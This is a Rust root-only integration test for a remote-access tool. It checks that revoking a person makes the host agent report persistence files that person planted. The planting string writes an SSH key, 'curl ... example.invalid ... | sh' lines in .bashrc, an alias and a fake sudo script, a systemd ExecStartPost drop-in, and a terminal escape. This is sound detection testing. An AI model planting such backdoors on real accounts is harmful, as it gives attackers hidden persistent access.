//! D356 delivered end to end on a real root host (#355): a live server with
//! its HTTPS listener, a real `infraternal agent` joined as root, a real
//! host login for a person on a real account, and the real CLI. The person
//! plants access lines through their own shell (a key, a startup line with a
//! terminal escape, a startup file linked into the home, a unit drop-in,
//! `~/.bash_aliases`, a program in `~/.local/bin`); revoking the person while
//! the host stays makes the agent report them, the server keeps them, and the
//! owner's Inbox route lists them (D398). A removal asks for no report: the
//! second test removes the host the same way and finds none.
//!
//! Run only as root, through a root clone of the commit under review (see the
//! job's script on #355): it creates real host logins and stops them.
use super::*;

/// The existing host account the person's login runs as.
const ACCOUNT: &str = "INFRATERNAL_ACCESS_REPORT_ACCOUNT";

/// POST `body` to `path` on the live server as the fixture's signed-in owner session.
/// Returns the status and the bounded answer.
async fn post(
    address: SocketAddr,
    root: &X509,
    origin: &str,
    cookie: &str,
    path: &str,
    body: &serde_json::Value,
) -> (hyper::StatusCode, Vec<u8>) {
    use http_body_util::BodyExt;
    let stream = tls(address, root).await;
    let (mut sender, connection) =
        hyper::client::conn::http1::handshake(hyper_util::rt::TokioIo::new(stream))
            .await
            .unwrap();
    let task = tokio::spawn(connection);
    let request = hyper::Request::builder()
        .method("POST")
        .uri(path)
        .header("host", format!("localhost:{}", address.port()))
        .header("origin", origin)
        .header("cookie", format!("__Host-infraternal={cookie}"))
        .header("content-type", "application/json")
        .body(http_body_util::Full::new(bytes::Bytes::from(
            serde_json::to_vec(body).unwrap(),
        )))
        .unwrap();
    let response = sender.send_request(request).await.unwrap();
    let status = response.status();
    let bytes = http_body_util::Limited::new(response.into_body(), 65536)
        .collect()
        .await
        .unwrap()
        .to_bytes()
        .to_vec();
    task.abort();
    (status, bytes)
}

/// See the module doc. Prints the CLI's output for the issue.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
#[ignore = "real root only: run through a root clone of the commit under review (#355)"]
async fn a_revoke_reaches_the_inbox_through_a_live_server() {
    assert_eq!(
        nix::unistd::Uid::effective().as_raw(),
        0,
        "real root required"
    );
    let binary = PathBuf::from(
        std::env::var_os("INFRATERNAL_REMOTE_TEST_BINARY").expect("real CLI binary required"),
    );
    let account = std::env::var(ACCOUNT).expect("set the host account for the login");
    let user = nix::unistd::User::from_name(&account)
        .unwrap()
        .expect("the host account exists");
    let directory = Directory::new();
    let address: SocketAddr = "127.0.0.1:4711".parse().unwrap();
    let fixture = fixture_at(&directory, address, "127.0.0.1:0".parse().unwrap()).await;
    // A passkey-shaped owner whose OS username is the test account, so the
    // terminal is a real host login for this person on that account.
    let owner = uuid::Uuid::new_v4();
    sqlx::query("UPDATE users SET owner=0 WHERE id='owner'")
        .execute(&fixture.pool)
        .await
        .unwrap();
    sqlx::query("INSERT INTO users(id,name,owner,recovery_hash,username,display_name) VALUES (?,'owner',1,'unused',?,'Owner')")
        .bind(owner.to_string())
        .bind(&account)
        .execute(&fixture.pool)
        .await
        .unwrap();
    sqlx::query("UPDATE sessions SET user_id=? WHERE token_hash=?")
        .bind(owner.to_string())
        .bind(crate::auth::hash(&fixture.cookie))
        .execute(&fixture.pool)
        .await
        .unwrap();
    let origin = format!("https://localhost:{}", address.port());
    let host = uuid::Uuid::new_v4();
    let marker = directory.0.join(".bootstrap-owner");
    std::fs::write(&marker, format!("{}\n", host.simple())).unwrap();
    std::fs::set_permissions(&marker, std::fs::Permissions::from_mode(0o600)).unwrap();
    let digest = prepare_pending_join_key(&directory.0.join("data"));
    let invitation = invitation_with_mode(
        address,
        &fixture.root,
        &origin,
        &fixture.cookie,
        host,
        ("rootful", 0),
        digest,
    )
    .await;
    let started = Instant::now();
    let mut child = cli(&binary, &directory, true, &origin);
    // Join reads the invitation to its end: write it and close stdin.
    child
        .0
        .stdin
        .take()
        .unwrap()
        .write_all(&invitation)
        .unwrap();
    drop(invitation);

    // The person's first login on the account: the agent records the
    // fingerprint of its access files (the grant).
    let mut browser = browser(address, &fixture.root, &origin, &fixture.cookie).await;
    let session = try_open_remote_with_budget(&mut browser, host, started, Duration::from_secs(60))
        .await
        .expect("the rootful host did not register");
    send(
        &mut browser,
        1,
        &Frame::AttachTerm {
            session_id: session.as_bytes(),
            last_out_seq: 0,
            last_in_seq: 0,
        },
    )
    .await;
    send(&mut browser, 1, &Frame::Credit { bytes: 1024 * 1024 }).await;
    let mut output = Vec::new();
    let mut cursor = 0;
    first_terminal_output(&mut browser, &mut output, &mut cursor).await;
    // Through the person's own shell: say who it runs as, then plant one new
    // key and one startup line carrying a terminal escape.
    let planting = b"printf 'WHO_%s_END\\n' \"$(id -un)\"; mkdir -p ~/.ssh && printf 'ssh-ed25519 AAAAlive live-left-behind\\n' >> ~/.ssh/authorized_keys && printf 'curl -s http://example.invalid/live | sh \\033[2J\\n' >> ~/.bashrc && printf 'curl -s http://example.invalid/linked | sh\\n' > ~/.evilrc && ln -s .evilrc ~/.zshrc && mkdir -p ~/.config/systemd/user/back.service.d && printf '[Service]\\nExecStartPost=/tmp/live-evil\\n' > ~/.config/systemd/user/back.service.d/x.conf && printf \"alias ls='curl -s http://example.invalid/alias | sh'\\n\" >> ~/.bash_aliases && mkdir -p ~/.local/bin && printf '#!/bin/sh\\ncurl -s http://example.invalid/sudo | sh\\n' > ~/.local/bin/sudo && printf 'PLANTED_%s\\n' DONE\n";
    send(
        &mut browser,
        1,
        &Frame::Input {
            in_seq: 0,
            bytes: planting,
        },
    )
    .await;
    until(&mut browser, &mut output, &mut cursor, b"PLANTED_DONE").await;
    let shown = String::from_utf8_lossy(&output);
    assert!(
        shown.contains(&format!("WHO_{account}_END")),
        "the shell does not run as {account}: {shown}"
    );
    drop(browser);

    // Revoke the person while the host stays: `/remote/revocations` answers
    // once the host has durably confirmed, and the report is kept with it.
    let (status, _) = post(
        address,
        &fixture.root,
        &origin,
        &fixture.cookie,
        "/remote/revocations",
        &serde_json::json!({"host_id": host}),
    )
    .await;
    assert_eq!(status, hyper::StatusCode::NO_CONTENT);
    let (status, answer) = post(
        address,
        &fixture.root,
        &origin,
        &fixture.cookie,
        "/remote/hosts/access-reports",
        &serde_json::json!({}),
    )
    .await;
    assert_eq!(status, hyper::StatusCode::OK);
    let answer: serde_json::Value = serde_json::from_slice(&answer).unwrap();
    println!("INBOX_ACCESS_REPORT {answer}");
    let item = &answer["reports"][0];
    assert_eq!(item["outcome"], "changed", "{answer}");
    let human = item["lines"]
        .as_array()
        .unwrap()
        .iter()
        .map(|line| line.as_str().unwrap())
        .collect::<Vec<_>>()
        .join("\n");
    println!("INBOX_ACCESS_REPORT_TEXT\n{human}");
    assert!(
        human.contains(&format!("Account {account}: changed since the grant.")),
        "{human}"
    );
    assert!(human.contains("~/.ssh/authorized_keys"), "{human}");
    // A startup file planted as a link into the home: the link is reported
    // with its target, and the target's line is shown (never followed).
    assert!(
        human.contains("new: ~/.zshrc (a symbolic link to .evilrc; not followed)"),
        "{human}"
    );
    assert!(
        human.contains("+ curl -s http://example.invalid/linked | sh"),
        "{human}"
    );
    // J334's previously unscanned places: ~/.bash_aliases and ~/.local/bin.
    assert!(
        human.contains("+ alias ls='curl -s http://example.invalid/alias | sh'"),
        "{human}"
    );
    assert!(human.contains("new: ~/.local/bin/sudo"), "{human}");
    // A systemd drop-in adding a command to a unit.
    assert!(
        human.contains("~/.config/systemd/user/back.service.d/x.conf"),
        "{human}"
    );
    assert!(human.contains("+ ExecStartPost=/tmp/live-evil"), "{human}");
    assert!(
        human.contains("  + ssh-ed25519 AAAAlive live-left-behind"),
        "{human}"
    );
    assert!(human.contains("~/.bashrc"), "{human}");
    assert!(
        human.contains("  + curl -s http://example.invalid/live | sh \u{fffd}[2J"),
        "{human}"
    );
    assert!(
        !human.contains('\u{1b}'),
        "a terminal escape reached the owner"
    );
    // Dismissing the item takes it out of the Inbox.
    let (status, _) = post(
        address,
        &fixture.root,
        &origin,
        &fixture.cookie,
        "/remote/hosts/access-reports/dismiss",
        &serde_json::json!({"host_id": host, "person_id": item["person_id"]}),
    )
    .await;
    assert_eq!(status, hyper::StatusCode::OK);
    // The files were reported, never edited.
    let keys = std::fs::read_to_string(user.dir.join(".ssh/authorized_keys")).unwrap();
    assert!(keys.contains("ssh-ed25519 AAAAlive live-left-behind"));
    let startup = std::fs::read(user.dir.join(".bashrc")).unwrap();
    assert!(startup.windows(4).any(|window| window == b"\x1b[2J"));
    assert_eq!(
        std::fs::read_link(user.dir.join(".zshrc")).unwrap(),
        Path::new(".evilrc")
    );
    println!("ACCESS_FILES_UNTOUCHED authorized_keys=kept bashrc=kept zshrc_link=kept");
    drop(child);
    drop(fixture);
    drop(directory);
}
